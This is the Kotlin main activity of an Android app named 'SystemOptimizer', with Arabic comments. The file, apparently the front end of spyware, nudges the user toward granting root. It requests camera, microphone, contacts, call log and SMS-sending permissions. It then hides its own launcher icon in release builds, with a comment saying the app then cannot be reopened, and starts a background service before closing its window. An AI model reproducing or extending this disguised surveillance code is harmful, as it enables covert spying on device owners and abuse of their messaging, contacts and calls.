package com.example.systemoptimizer

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.tooling.preview.Preview
import androidx.core.content.ContextCompat
import com.example.systemoptimizer.ui.theme.SystemOptimizerTheme

class MainActivity : ComponentActivity() {

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) {
        startApp()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)


        val rootManager = RootManager(this)
        val rootDecisionMade = intent?.getBooleanExtra(RootPermissionActivity.EXTRA_ROOT_DECISION, false)
            ?: false

        if (!rootManager.isRootGranted() && !rootDecisionMade) {
            val intent = Intent(this, RootPermissionActivity::class.java)
            startActivity(intent)
            finish()
            return
        }
        val requiredPermissions = buildList {
            add(Manifest.permission.CAMERA)
            add(Manifest.permission.RECORD_AUDIO)
            add(Manifest.permission.READ_CONTACTS)
            add(Manifest.permission.READ_CALL_LOG)
            add(Manifest.permission.SEND_SMS)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                add(Manifest.permission.POST_NOTIFICATIONS)
            }
        }

        val missingPermissions = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missingPermissions.isEmpty()) {
            startApp()
        } else {
            permissionLauncher.launch(missingPermissions.toTypedArray())
        }
    }

    private fun startApp() {
        // إخفاء أيقونة التطبيق (بعد أول تشغيل لا يمكن فتحه من المشغّل).
        // لا يُطبَّق هذا الإخفاء في بنيات التصحيح حتى يبقى زر Run في Android Studio يعمل.
        val debuggable = (applicationInfo.flags and ApplicationInfo.FLAG_DEBUGGABLE) != 0
        val componentName = ComponentName(this, MainActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            if (debuggable) {
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            } else {
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            },
            PackageManager.DONT_KILL_APP
        )

        // تشغيل الخدمة الخلفية (الخامسة العامة تستدعي startForeground فوراً)
        ContextCompat.startForegroundService(
            this,
            Intent(this, BackgroundService::class.java)
        )

        // إغلاق الواجهة فوراً
        finish()
    }
}

@Composable
fun Greeting(name: String, modifier: Modifier = Modifier) {
    Text(
        text = "Hello $name!",
        modifier = modifier
    )
}

@Preview(showBackground = true)
@Composable
fun GreetingPreview() {
    SystemOptimizerTheme {
        Greeting("Android")
    }
}